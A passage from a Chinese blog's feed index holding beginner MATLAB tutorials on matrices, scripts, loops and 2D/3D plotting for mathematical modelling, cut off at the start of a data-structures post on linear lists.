          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
            <tag> 二进制安全 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>数学建模-day5</title>
      <link href="/2018/10/13/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1-day5/"/>
      <url>/2018/10/13/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1-day5/</url>
      
        <content type="html"><![CDATA[<p>……</p><a id="more"></a><h1 id="数学建模-day5-线性代数"><a href="#数学建模-day5-线性代数" class="headerlink" title="数学建模_day5 - 线性代数"></a>数学建模_day5 - 线性代数</h1><blockquote><p>​    线性代数相信大家都学过哒，基本是大学的理科必修课，而线性代数常用于工程数学，自然而然就和数学建模有很大的关系啦，今天学习一下用matlab做一些相关的线性代数学习。</p></blockquote><h2 id="矩阵"><a href="#矩阵" class="headerlink" title="矩阵"></a>矩阵</h2><blockquote><p>​    MATLAB 提供了许多函数，用于创建各种类型的矩阵。例如，你就可以使用基于帕斯卡三角形的项创建一个对称矩阵： </p></blockquote><pre class=" language-matlab"><code class="language-matlab">A <span class="token operator">=</span> <span class="token function">pascal</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>#虚线下为运行结果A <span class="token operator">=</span>       <span class="token number">1</span>     <span class="token number">1</span>     <span class="token number">1</span>       <span class="token number">1</span>     <span class="token number">2</span>     <span class="token number">3</span>       <span class="token number">1</span>     <span class="token number">3</span>     <span class="token number">6</span></code></pre><blockquote><p>我们也可以创建一个非对称<em>幻方矩阵</em>，它的行总和与列总和相等： </p></blockquote><pre class=" language-matlab"><code class="language-matlab">B <span class="token operator">=</span> <span class="token function">magic</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>#虚线下为运行结果B <span class="token operator">=</span>       <span class="token number">8</span>     <span class="token number">1</span>     <span class="token number">6</span>       <span class="token number">3</span>     <span class="token number">5</span>     <span class="token number">7</span>       <span class="token number">4</span>     <span class="token number">9</span>     <span class="token number">2</span></code></pre><blockquote><p>​    这里我们学习一下<code>randi()</code>函数，randi的第一个参数可以用于描述产生矩阵的数值范围，后面的两个参数是行列数，例如：</p></blockquote><pre class=" language-matlab"><code class="language-matlab">a <span class="token operator">=</span> <span class="token function">randi</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>#虚线下为运行结果a <span class="token operator">=</span>    <span class="token number">17</span>    <span class="token number">13</span>    <span class="token number">20</span>    <span class="token number">20</span>     <span class="token number">9</span>    <span class="token number">19</span>     <span class="token number">2</span>    <span class="token number">20</span>    <span class="token number">10</span>    <span class="token number">19</span>     <span class="token number">3</span>     <span class="token number">6</span>     <span class="token number">4</span>    <span class="token number">17</span>    <span class="token number">16</span>    <span class="token number">19</span>    <span class="token number">11</span>    <span class="token number">20</span>     <span class="token number">3</span>    <span class="token number">20</span></code></pre><h2 id="矩阵的转置"><a href="#矩阵的转置" class="headerlink" title="矩阵的转置"></a>矩阵的转置</h2><blockquote><p>​    我们知道矩阵有实数矩阵和复数矩阵两种，对于实矩阵，<em>转置</em>运算对 aij 和 aji 进行交换。对于复矩阵，还要考虑是否用数组中复数项的复共轭来形成<em>复共轭转置</em>。MATLAB 使用撇号运算符 (<code>&#39;</code>) 执行复共轭转置，使用点撇号运算符 (<code>.&#39;</code>) 执行无共轭的转置。对于包含所有实数元素的矩阵，这两个运算符返回相同结果。 </p><p>实矩阵转置示例：</p></blockquote><pre class=" language-matlab"><code class="language-matlab">#这里拿上一步的a值做测试a<span class="token operator">'</span>ans <span class="token operator">=</span>    <span class="token number">17</span>    <span class="token number">19</span>     <span class="token number">3</span>    <span class="token number">19</span>    <span class="token number">13</span>     <span class="token number">2</span>     <span class="token number">6</span>    <span class="token number">11</span>    <span class="token number">20</span>    <span class="token number">20</span>     <span class="token number">4</span>    <span class="token number">20</span>    <span class="token number">20</span>    <span class="token number">10</span>    <span class="token number">17</span>     <span class="token number">3</span>     <span class="token number">9</span>    <span class="token number">19</span>    <span class="token number">16</span>    <span class="token number">20</span>#事实证明实矩阵 a<span class="token operator">'</span>和a<span class="token operator">.'</span>操作是一样的结果     a<span class="token operator">.'</span>ans <span class="token operator">=</span>    <span class="token number">17</span>    <span class="token number">19</span>     <span class="token number">3</span>    <span class="token number">19</span>    <span class="token number">13</span>     <span class="token number">2</span>     <span class="token number">6</span>    <span class="token number">11</span>    <span class="token number">20</span>    <span class="token number">20</span>     <span class="token number">4</span>    <span class="token number">20</span>    <span class="token number">20</span>    <span class="token number">10</span>    <span class="token number">17</span>     <span class="token number">3</span>     <span class="token number">9</span>    <span class="token number">19</span>    <span class="token number">16</span>    <span class="token number">20</span></code></pre><blockquote><p>定义复数矩阵并进行转置:</p></blockquote><pre class=" language-matlab"><code class="language-matlab">z <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">+</span><span class="token number">2i</span> <span class="token number">3</span><span class="token operator">+</span><span class="token number">2i</span> <span class="token number">5</span><span class="token operator">+</span><span class="token number">i</span><span class="token punctuation">;</span><span class="token number">2</span><span class="token operator">+</span><span class="token number">i</span> <span class="token number">9</span><span class="token operator">+</span><span class="token number">i</span> <span class="token number">4</span><span class="token operator">+</span><span class="token number">5i</span><span class="token punctuation">]</span>z <span class="token operator">=</span>   <span class="token number">1.0000</span> <span class="token operator">+</span> <span class="token number">2.0000i</span>   <span class="token number">3.0000</span> <span class="token operator">+</span> <span class="token number">2.0000i</span>   <span class="token number">5.0000</span> <span class="token operator">+</span> <span class="token number">1.0000i</span>   <span class="token number">2.0000</span> <span class="token operator">+</span> <span class="token number">1.0000i</span>   <span class="token number">9.0000</span> <span class="token operator">+</span> <span class="token number">1.0000i</span>   <span class="token number">4.0000</span> <span class="token operator">+</span> <span class="token number">5.0000i</span>#z 的共轭转置为：z<span class="token operator">'</span>ans <span class="token operator">=</span>   <span class="token number">1.0000</span> <span class="token operator">-</span> <span class="token number">2.0000i</span>   <span class="token number">2.0000</span> <span class="token operator">-</span> <span class="token number">1.0000i</span>   <span class="token number">3.0000</span> <span class="token operator">-</span> <span class="token number">2.0000i</span>   <span class="token number">9.0000</span> <span class="token operator">-</span> <span class="token number">1.0000i</span>   <span class="token number">5.0000</span> <span class="token operator">-</span> <span class="token number">1.0000i</span>   <span class="token number">4.0000</span> <span class="token operator">-</span> <span class="token number">5.0000i</span>#z 的非共轭转置z<span class="token operator">.'</span>ans <span class="token operator">=</span>   <span class="token number">1.0000</span> <span class="token operator">+</span> <span class="token number">2.0000i</span>   <span class="token number">2.0000</span> <span class="token operator">+</span> <span class="token number">1.0000i</span>   <span class="token number">3.0000</span> <span class="token operator">+</span> <span class="token number">2.0000i</span>   <span class="token number">9.0000</span> <span class="token operator">+</span> <span class="token number">1.0000i</span>   <span class="token number">5.0000</span> <span class="token operator">+</span> <span class="token number">1.0000i</span>   <span class="token number">4.0000</span> <span class="token operator">+</span> <span class="token number">5.0000i</span></code></pre><h2 id="矩阵的乘积"><a href="#矩阵的乘积" class="headerlink" title="矩阵的乘积"></a>矩阵的乘积</h2><blockquote><p>​    之前学习线性代数的时候，计算矩阵的乘积都是按公式来算，现在可以通过matlab for循环来实现这个计算：</p></blockquote><pre class=" language-matlab"><code class="language-matlab">A <span class="token operator">=</span> <span class="token function">pascal</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>B <span class="token operator">=</span> <span class="token function">magic</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>m <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span> n <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">i</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token operator">:</span>m     <span class="token keyword">for</span> <span class="token number">j</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token operator">:</span>n        <span class="token function">C</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">A</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token function">B</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">end</span><span class="token keyword">end</span></code></pre><blockquote><p>​    按矩阵乘法规则，矩阵可以在其右侧乘以列向量，在左侧乘以行向量。</p></blockquote><blockquote><p>​    接下来结合具体数学实例，来进行更深入的综合性学习。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 数学建模 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数模 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>数学建模-day4</title>
      <link href="/2018/10/09/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1-day4/"/>
      <url>/2018/10/09/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1-day4/</url>
      
        <content type="html"><![CDATA[<p>……</p><a id="more"></a><h1 id="数学建模-day4-matlab编程和脚本"><a href="#数学建模-day4-matlab编程和脚本" class="headerlink" title="数学建模_day4 - matlab编程和脚本"></a>数学建模_day4 - matlab编程和脚本</h1><h2 id="创建与运行脚本"><a href="#创建与运行脚本" class="headerlink" title="创建与运行脚本"></a>创建与运行脚本</h2><blockquote><p>​    <em>脚本</em>是最简单的一种 MATLAB® 程序。脚本是一个包含多行连续 MATLAB 命令和函数调用的扩展名为 <code>.m</code> 的文件。在命令行中键入脚本名称即可运行该脚本。 </p></blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; 要创建脚本，可以使用 <code>edit &quot;filename&quot;</code></p><pre class=" language-matlab"><code class="language-matlab"><span class="token comment" spellcheck="true">% 这会打开一个名为 "filename".m 的空白文件。输入一些绘制随机数据的向量的代码：</span>n <span class="token operator">=</span> <span class="token number">50</span><span class="token punctuation">;</span>r <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">plot</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token comment" spellcheck="true">% mean 函数求均值，对生成的50个值求平均</span><span class="token comment" spellcheck="true">% mean(r,1)表示对每列求平均</span><span class="token comment" spellcheck="true">% mean(r,2)表示对每行求平均</span><span class="token comment" spellcheck="true">% Draw a line from (0,m) to (n,m)</span>m <span class="token operator">=</span> <span class="token function">mean</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">% hold on 是当前轴及图像保持而不被刷新，准备接受此后将绘制的图形，多图共存</span>hold on<span class="token function">plot</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span>n<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>m<span class="token punctuation">,</span>m<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">% hold off 是当前轴及图像不再具备被刷新的性质，新图出现时，取消原图。即，关闭图形保持功能</span>hold off<span class="token function">title</span><span class="token punctuation">(</span><span class="token string">'Mean of Random Uniform Data'</span><span class="token punctuation">)</span></code></pre><blockquote><p>成品图如下：</p></blockquote><div align="center"><br><br><img src="https://i.loli.net/2018/10/10/5bbdfdf74ac32.png" alt=""><br><br></div><blockquote><p>保存文件后可以通过右键运行，也可直接输入文件名运行。</p></blockquote><div align="center"><img src="https://i.loli.net/2018/10/10/5bbe0157d413b.png" alt=""><br><br></div><h2 id="for-循环"><a href="#for-循环" class="headerlink" title="for 循环"></a>for 循环</h2><blockquote><p>通过一段代码来直接看看matlab的for循环有什么不一样：</p></blockquote><pre class=" language-matlab"><code class="language-matlab">nsamples <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>npoints <span class="token operator">=</span> <span class="token number">50</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">% matlab 的 for循环是 for i=n:m 的形式，范围为n到m，需要用end关键词表示结束</span><span class="token keyword">for</span> k <span class="token operator">=</span> <span class="token number">1</span><span class="token operator">:</span>nsamples   iterationString <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'Iteration #'</span><span class="token punctuation">,</span><span class="token function">int2str</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">%disp类似printf 用于打印语句</span>   <span class="token function">disp</span><span class="token punctuation">(</span>iterationString<span class="token punctuation">)</span>   currentData <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span>npoints<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token function">sampleMean</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">mean</span><span class="token punctuation">(</span>currentData<span class="token punctuation">)</span><span class="token keyword">end</span>overallMean <span class="token operator">=</span> <span class="token function">mean</span><span class="token punctuation">(</span>sampleMean<span class="token punctuation">)</span></code></pre><blockquote><p>效果图如下：</p></blockquote><div align="center"><img src="https://i.loli.net/2018/10/10/5bbe048ca9c1b.png" alt=""></div><blockquote><p>需要注意的是：脚本位置</p><blockquote><p>MATLAB 在特定位置中查找脚本及其他文件。要运行脚本，该文件必须位于当前文件夹或<em>搜索路径</em>中的某个文件夹内。</p><p>默认情况下，MATLAB 安装程序创建的 <code>MATLAB</code> 文件夹位于此搜索路径中。如果要将程序存储在其他文件夹，或者要运行其他文件夹中的程序，请将其添加到此搜索路径。在当前文件夹浏览器中选中相应的文件夹，右键点击，然后选择<strong>添加到路径</strong>。</p></blockquote></blockquote><h2 id="用函数生成矩阵"><a href="#用函数生成矩阵" class="headerlink" title="用函数生成矩阵"></a>用函数生成矩阵</h2><table><thead><tr><th style="text-align:left">函数</th><th>特征</th></tr></thead><tbody><tr><td style="text-align:left">ones</td><td>全部为1</td></tr><tr><td style="text-align:left">rand</td><td>均匀分布的随机元素</td></tr><tr><td style="text-align:left">randn</td><td>正态分布的随机元素</td></tr><tr><td style="text-align:left">zeros</td><td>全部为0</td></tr><tr><td style="text-align:left">magic</td><td>创建几乎任意大小的幻方矩阵</td></tr></tbody></table><h2 id="查看帮助"><a href="#查看帮助" class="headerlink" title="查看帮助"></a>查看帮助</h2><blockquote><p>所有 MATLAB函数都有辅助文档，这些文档包含一些示例，并介绍函数输入、输出和调用语法。从命令行访问此信息有多种方法，如下图：</p></blockquote><div align="center"><img src="https://i.loli.net/2018/10/10/5bbe0593a6722.png" alt=""></div><blockquote><p>今日到此。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 数学建模 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数模 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>数学建模-day3</title>
      <link href="/2018/10/07/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1-day3/"/>
      <url>/2018/10/07/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1-day3/</url>
      
        <content type="html"><![CDATA[<p>……</p><a id="more"></a><h1 id="数学建模-day3-matlab-基本用法"><a href="#数学建模-day3-matlab-基本用法" class="headerlink" title="数学建模_day3 - matlab 基本用法"></a>数学建模_day3 - matlab 基本用法</h1><p>&nbsp; &nbsp; &nbsp; &nbsp; day3 继续 day2的 matlab 基本用法学习，今天学习数学模型绘图，matlab的绘图功能十分强大，各种功能如下图。</p><p><img src="https://i.loli.net/2018/10/08/5bbaf8f1ec8e8.png" alt=""></p><h2 id="六-根据条件构建二维图和三维图像"><a href="#六-根据条件构建二维图和三维图像" class="headerlink" title="六. 根据条件构建二维图和三维图像"></a>六. 根据条件构建二维图和三维图像</h2><h3 id="plot-函数-–-二维"><a href="#plot-函数-–-二维" class="headerlink" title="plot 函数 – 二维"></a>plot 函数 – 二维</h3><p> &nbsp; &nbsp; &nbsp; 创建二维线图首先需要构建一个二维的函数，比如常见的 y = sin(x)，y = 2*x，y = 2^x。</p><p> &nbsp; &nbsp; &nbsp; 可以通过以下代码定义y = sin(x)函数:</p><pre class=" language-matlab"><code class="language-matlab">x <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">100</span><span class="token operator">:</span><span class="token number">10</span><span class="token operator">:</span><span class="token number">100</span><span class="token punctuation">;</span>     <span class="token operator">/</span><span class="token operator">/</span>创建一个<span class="token operator">-</span><span class="token number">100</span>到<span class="token number">100</span>步长为<span class="token number">10</span>的一维数组用来作为Xy <span class="token operator">=</span> <span class="token function">sin</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token operator">/</span><span class="token operator">/</span>构成函数 y <span class="token operator">=</span> <span class="token function">sin</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span></code></pre><p><code>成品图如下</code>：</p><div align="center"><img src="https://i.loli.net/2018/10/08/5bbae75ed9328.png" alt=""></div><p> &nbsp; &nbsp; &nbsp; 因为步长的关系造成了这张图片的狰狞，不过没关系，我们可以改一下x的范围：</p><pre class=" language-matlab"><code class="language-matlab">x <span class="token operator">=</span> <span class="token number">0</span><span class="token operator">:</span><span class="token keyword">pi</span><span class="token operator">/</span><span class="token number">100</span><span class="token operator">:</span><span class="token number">2</span><span class="token operator">*</span><span class="token keyword">pi</span><span class="token punctuation">;</span> <span class="token operator">/</span><span class="token operator">/</span>改成单位圆范围y <span class="token operator">=</span> <span class="token function">sin</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">plot</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span></code></pre><p><code>成品图如下</code>：</p><div align="center"><img src="https://i.loli.net/2018/10/08/5bbae85f7aa9f.png" alt=""><br><br></div><h3 id="surf-和-mesh-函数-–-三维"><a href="#surf-和-mesh-函数-–-三维" class="headerlink" title="surf 和 mesh 函数 – 三维"></a>surf 和 mesh 函数 – 三维</h3><p> &nbsp; &nbsp; &nbsp; 三维图通常显示一个由带两个变量的函数（即 <em>z = f (x,y</em>)）定义的曲面图。 surf 函数及其伴随函数 mesh 以三维形式显示曲面图。surf 使用颜色显示曲面图的连接线和面。mesh 生成仅以颜色标记连接定义点的线条的线框曲面图。</p><p> &nbsp; &nbsp; &nbsp; 例如在三维坐标系中，构建一个 Z=1，-1&lt;x&lt;1，-1&lt;y&lt;1，的平面，我们要输入以下代码：</p><pre class=" language-matlab"><code class="language-matlab">x <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">0.1</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">;</span>y <span class="token operator">=</span> x<span class="token punctuation">;</span>z <span class="token operator">=</span> <span class="token function">ones</span><span class="token punctuation">(</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">mesh</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span>z<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><code>成品图如下</code>：</p><div align="center"><img src="https://i.loli.net/2018/10/08/5bbaf6e837e65.png" alt=""></div><p> &nbsp; &nbsp; &nbsp; exp函数，例如exp(5)代表的是e^5。要计算 <em>z</em>，请首先使用 <code>meshgrid</code> 在将要创建的三维函数的域中创建一组 (<em>x,y</em>) 点。 ：</p><pre class=" language-matlab"><code class="language-matlab"><span class="token punctuation">[</span>X<span class="token punctuation">,</span>Y<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">meshgrid</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">2</span><span class="token operator">:</span><span class="token punctuation">.</span><span class="token number">2</span><span class="token operator">:</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">/</span><span class="token operator">/</span>创建<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>点Z <span class="token operator">=</span> X <span class="token operator">.*</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token operator">-</span>X<span class="token operator">.^</span><span class="token number">2</span> <span class="token operator">-</span> Y<span class="token operator">.^</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">/</span><span class="token operator">/</span>得到Z<span class="token function">surf</span><span class="token punctuation">(</span>X<span class="token punctuation">,</span>Y<span class="token punctuation">,</span>Z<span class="token punctuation">)</span>；                <span class="token operator">/</span><span class="token operator">/</span>画图</code></pre><p><code>成品图如下</code>：</p><div align="center"><img src="https://i.loli.net/2018/10/08/5bbaf9b2535a5.png" alt=""></div><h3 id="cylinder-和-subplot-函数"><a href="#cylinder-和-subplot-函数" class="headerlink" title="cylinder 和 subplot 函数"></a>cylinder 和 subplot 函数</h3><p> &nbsp; &nbsp; &nbsp; cylinder通常用于生成圆柱模型并返回x，y，z坐标值，subplot通常用于分割窗口用以显示不同的图形。</p><pre class=" language-matlab"><code class="language-matlab">Matlab cylinder 函数：　　<span class="token number">1</span>、cylinder函数功能说明：绘制三维圆柱图。　　<span class="token number">2</span>、cylinder函数用法说明：　　（<span class="token number">1</span>）<span class="token punctuation">[</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span>z<span class="token punctuation">]</span><span class="token operator">=</span>cylinder 函数返回一半径和高度都为<span class="token number">1</span>的圆柱体x，y，z轴的坐标值，圆柱体沿其周长有<span class="token number">20</span>个等距分布的点；　　（<span class="token number">2</span>）<span class="token punctuation">[</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span>z<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">cylinder</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span> 函数一个半径为r、高度为<span class="token number">1</span>的圆柱体的x，y，z轴的坐标值，圆柱体沿其周长有<span class="token number">20</span>个等距分布的点；　　（<span class="token number">3</span>）<span class="token punctuation">[</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span>z<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">cylinder</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span>n<span class="token punctuation">)</span> 函数一个半径为r、高度为<span class="token number">1</span>的圆柱体的x，y，z轴的坐标值，圆柱体沿其周长有n个等距分布的点；　　（<span class="token number">4</span>）<span class="token function">cylinder</span><span class="token punctuation">(</span><span class="token punctuation">...</span><span class="token punctuation">)</span> 函数只绘制圆柱，没有任何的输出参量。其他参量及结果同上。</code></pre><p> &nbsp; &nbsp; &nbsp; 用一个例子来展示一下cylinder和subplot的用法：</p><pre class=" language-matlab"><code class="language-matlab">t <span class="token operator">=</span> <span class="token number">0</span><span class="token operator">:</span><span class="token keyword">pi</span><span class="token operator">/</span><span class="token number">10</span><span class="token operator">:</span><span class="token number">2</span><span class="token operator">*</span><span class="token keyword">pi</span><span class="token punctuation">;</span><span class="token punctuation">[</span>X<span class="token punctuation">,</span>Y<span class="token punctuation">,</span>Z<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">cylinder</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">+</span><span class="token function">cos</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">surf</span><span class="token punctuation">(</span>X<span class="token punctuation">,</span>Y<span class="token punctuation">,</span>Z<span class="token punctuation">)</span><span class="token function">subplot</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">mesh</span><span class="token punctuation">(</span>X<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">title</span><span class="token punctuation">(</span><span class="token string">'X'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">subplot</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">mesh</span><span class="token punctuation">(</span>Y<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">title</span><span class="token punctuation">(</span><span class="token string">'Y'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">subplot</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">mesh</span><span class="token punctuation">(</span>Z<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">title</span><span class="token punctuation">(</span><span class="token string">'Z'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">subplot</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">mesh</span><span class="token punctuation">(</span>X<span class="token punctuation">,</span>Y<span class="token punctuation">,</span>Z<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">title</span><span class="token punctuation">(</span><span class="token string">'X,Y,Z'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><code>成品图如下</code>：</p><div align="center"><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/08/5bbafba7df128.png" class="lazyload"></div>]]></content>
      
      
      <categories>
          
          <category> 数学建模 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数模 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>数据结构和算法-day2</title>
      <link href="/2018/10/07/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95-day2/"/>
      <url>/2018/10/07/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95-day2/</url>
      
        <content type="html"><![CDATA[<p>……</p><a id="more"></a><h1 id="数据结构和算法-（Algorithm）-线性结构"><a href="#数据结构和算法-（Algorithm）-线性结构" class="headerlink" title="数据结构和算法 （Algorithm）- 线性结构"></a>数据结构和算法 （Algorithm）- 线性结构</h1><p>&nbsp; &nbsp; &nbsp; &nbsp; 线性结构的基本特征是：在数据元素的非空有限集中，有且仅有一个元素没有前驱，有且仅有一个数据元素没有后继；其余数据元素有且仅有只有一个直接的前驱和后继。</p><pre class=" language-c"><code class="language-c">例如<span class="token punctuation">:</span>   <span class="token operator">*</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">*</span></code></pre><h2 id="线性表"><a href="#线性表" class="headerlink" title="线性表"></a>线性表</h2><p> &nbsp; &nbsp; &nbsp; 线性表是由同一类型的数据元素构成的线性结构，特点是：数据元素间呈一种线性关系。线性表是具有相同数据类型的n个数据元素的有限序列，通常记为：</p><p>（a1，a2，a3，······，a(i-1)，ai，a(i+1)，······，an）</p><p><code>线性表抽象数据类型</code>：</p><pre class=" language-c"><code class="language-c">ADT List<span class="token punctuation">{</span>数据对象<span class="token punctuation">:</span> D<span class="token operator">=</span><span class="token punctuation">{</span>ai<span class="token operator">|</span> <span 